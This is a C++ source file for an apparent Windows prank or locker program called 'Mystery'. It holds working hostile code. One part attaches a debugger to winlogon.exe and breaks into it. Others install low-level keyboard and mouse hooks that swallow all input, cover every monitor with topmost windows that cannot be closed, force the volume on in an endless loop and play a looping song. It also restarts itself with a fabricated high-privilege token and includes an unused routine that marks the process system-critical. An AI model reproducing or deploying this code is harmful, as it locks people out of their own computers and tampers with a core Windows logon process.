#include "program.h"
#include "CoverImage.h"
#include "MysterySong.h"
#include "EZAudioClient.h"
#include "EZError.h"
#include "EZTokens.h"
#include <tlhelp32.h>
#include <sddl.h>
#include <thread>
#include <iostream>
#include <fstream>
#include <vector>

void InteractProcess() {
	HWINSTA WinSta0 = OpenWindowStation(L"WinSta0", FALSE, GENERIC_ALL);
	if (WinSta0 == NULL) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	if (!SetProcessWindowStation(WinSta0)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Intentionally leave window station handle open because we need it for the duration of this program.
}
void InteractThread() {
	HDESK currentDesktop = OpenInputDesktop(0, FALSE, GENERIC_ALL);
	if (currentDesktop == NULL) {
		DWORD lastError = GetLastError();
		if (lastError == ERROR_INVALID_FUNCTION) {
			currentDesktop = OpenDesktop(L"Winlogon", 0, FALSE, GENERIC_ALL);
			if (currentDesktop == NULL) {
				EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
			}
		}
		else {
			EZ::Error::ThrowFromCode(lastError, __FILE__, __LINE__);
		}
	}

	if (!SetThreadDesktop(currentDesktop)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Intentionally leave desktop handle open because we need it for the duration of this thread.
}

// NO LONGER USED
typedef long (WINAPI* SetProcessIsCritical) (
	IN BOOLEAN    bNew, // new setting for process
	OUT BOOLEAN* pbOld, // pointer which receives old setting (can be null)
	IN BOOLEAN    bNeedScb); // need system critical breaks
void MakeSystemCritical()
{
	// Load ntdll.dll
	HMODULE ntdll = LoadLibrary(L"ntdll.dll");
	if (ntdll == NULL) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Bind SetCriticalProcess to the RtlSetProcessIsCritical function in ntdll.dll.
	SetProcessIsCritical setCriticalProcess = reinterpret_cast<SetProcessIsCritical>(GetProcAddress(ntdll, "RtlSetProcessIsCritical"));
	if (setCriticalProcess == NULL) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Call the SetCriticalProcess function with TRUE to make the current process system critical.
	setCriticalProcess(TRUE, NULL, FALSE);
}

void LockMaxVolume() {
	try {
		std::thread volumeLockThread([]() {
			try {
				InteractThread();

				while (true) {
					try {
						EZ::AudioClient::SetVolume(0.25f);
					}
					catch (EZ::Error error) { error.Print(); }
					try {
						EZ::AudioClient::SetMute(FALSE);
					}
					catch (EZ::Error error) { error.Print(); }
				}
			}
			catch (EZ::Error error) { error.Print(); }
			});
		volumeLockThread.detach();
	}
	catch (EZ::Error error) { error.Print(); }
}

DWORD GetWinLogonPID2() {
	// Create a snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	// Search through running processes using the snapshot.
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(snapshot, &processEntry)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	do {
		// If the current process is winlogon.exe return its PID.
		if (lstrcmpW(processEntry.szExeFile, L"winlogon.exe") == 0) {
			DWORD winlogonPID = processEntry.th32ProcessID;
			if (!CloseHandle(snapshot)) {
				EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
			}
			return winlogonPID;
		}
	} while (Process32Next(snapshot, &processEntry));

	// Cleanup and throw an error because winlogon.exe could not be found.
	if (!CloseHandle(snapshot)) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}
	throw EZ::Error(L"WinLogon.exe could not be found in the list of running processes.", __FILE__, __LINE__);
}
void BreakWinlogon() {
	try {
		// Get winlogon PID
		DWORD winlogonPID = GetWinLogonPID2();

		// Attach debugger to winlogon
		if (!DebugActiveProcess(winlogonPID)) {
			EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
		}

		// Open process handle to winlogon
		HANDLE winlogonHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPID);
		if (winlogonHandle == INVALID_HANDLE_VALUE) {
			EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
		}

		// Break winlogon
		if (!DebugBreakProcess(winlogonHandle)) {
			EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
		}
	}
	catch (EZ::Error error) { error.Print(); }
}

LRESULT CALLBACK BlockingHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return 1; // Returning 1 indicates the event has been handled and should not be sent to any other handlers.
}
void BlockInput()
{
	try {
		BOOL hookInitialized = FALSE;
		std::thread windowThread([&hookInitialized]() {
			try {
				InteractThread();

				// Set up the low level keyboard and mouse hooks to disable those devices.
				HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, BlockingHookProc, NULL, NULL);
				if (keyboardHook == NULL) {
					EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
				}
				HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, BlockingHookProc, NULL, NULL);
				if (mouseHook == NULL) {
					EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
				}

				hookInitialized = TRUE;

				MSG msg = { };
				while (GetMessage(&msg, NULL, 0, 0))
				{
					TranslateMessage(&msg);
					DispatchMessage(&msg);
				}
			}
			catch (EZ::Error error) { error.Print(); }
			});
		windowThread.detach();

		while (!hookInitialized) {}
	}
	catch (EZ::Error error) { error.Print(); }
}

BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
	std::vector<HMONITOR>* monitors = reinterpret_cast<std::vector<HMONITOR>*>(dwData);
	monitors->push_back(hMonitor);
	return TRUE;
}
DWORD GetMonitors(HMONITOR*& output) {
	std::vector<HMONITOR> monitors = { };
	if (!EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, reinterpret_cast<LPARAM>(&monitors))) {
		EZ::Error::ThrowFromCode(GetLastError(), __FILE__, __LINE__);
	}

	DWORD length = monitors.size();
	output = new HMONITOR[length];
	for (DWORD i = 0; i < length; ++i) {
		output[i] = monitors[i];
	}
	return length;
}

void Update(EZ::Program* program) {
	try {
		ID2D1Bitmap* mysteryImage = *program->GetUserDataAs<ID2D1Bitmap*>();
		D2D1_SIZE_U rendererSize = program->GetRenderer()->GetSize();
		D2D1_RECT_L rendererRect = EZ::RectL(0, 0, rendererSize.width, rendererSize.height);
		program->GetRenderer()->DrawBitmap(mysteryImage, rendererRect);
	}
	catch (EZ::Error error) { error.Print(); }
}

void CoverMonitor(HMONITOR monitor) {
	std::thread monitorThread([monitor]() {
		try {
			InteractThread();

			EZ::ClassSettings classSettings = { };
			classSettings.ThisThreadOnly = TRUE;
			classSettings.NoCloseOption = TRUE;

			MONITORINFO monitorInfo;
			monitorInfo.cbSize = sizeof(MONITORINFO);
			GetMonitorInfo(monitor, &monitorInfo);

			EZ::WindowSettings windowSettings = { };
			windowSettings.HideInTaskbar = TRUE;
			windowSettings.Title = L"Mystery Experience Host Window";
			windowSettings.LaunchHidden = TRUE;
			windowSettings.TopMost = TRUE;
			windowSettings.StylePreset = EZ::WindowStylePreset::Boarderless;
			windowSettings.InitialX = monitorInfo.rcMonitor.left;
			windowSettings.InitialY = monitorInfo.rcMonitor.top;
			windowSettings.InitialWidth = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
			windowSettings.InitialHeight = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;

			EZ::RendererSettings rendererSettings = { };
			rendererSettings.UseVSync = TRUE;
			rendererSettings.OptimizeForSingleThread = TRUE;

			ID2D1Bitmap* mysteryImage = NULL;

			EZ::ProgramSettings programSettings = { };
			programSettings.IgnoreWMClose = TRUE;
			programSettings.PreformanceLogInterval = 60;
			programSettings.UpdateCallback = Update;
			programSettings.UserData = &mysteryImage;

			EZ::Program* program = new EZ::Program(programSettings, classSettings, windowSettings, rendererSettings);

			mysteryImage = program->GetRenderer()->LoadBitmap(CoverImage_Asset);

			program->Run();

			delete program;
		}
		catch (EZ::Error error) { error.Print(); std::exit(1); }
		});
	monitorThread.detach();
}

int main() {
	try {
		HANDLE currentToken = EZ::OpenCurrentToken();

		EZ::LogTokenInfo(currentToken, std::wcout);

		return 0;

		TOKEN_SOURCE currentTokenSource = EZ::GetTokenSource(currentToken);
		BOOL isGod = currentTokenSource.SourceIdentifier.LowPart = 0x00000000 && currentTokenSource.SourceIdentifier.HighPart == 0x00000000 && lstrcmpA(currentTokenSource.SourceName, "Mystery\0") == 0;
		EZ::CloseToken(currentToken);

		if (!isGod) {
			HANDLE godToken = EZ::CreateGodToken();
			EZ::RestartWithToken(godToken);
		}

		return 0;

		EZ::EnableAllPrivileges(currentToken);

		InteractProcess();
		InteractThread();

		BreakWinlogon();

		BlockInput();

		LockMaxVolume();

		HMONITOR* monitors;
		DWORD monitorCount = GetMonitors(monitors);

		for (DWORD i = 0; i < monitorCount; i++)
		{
			CoverMonitor(monitors[i]);
		}

		EZ::AudioClient::PlayExclusiveLooping(MysterySong_Asset);
	}
	catch (EZ::Error error) { error.Print(); ExitProcess(1); }
}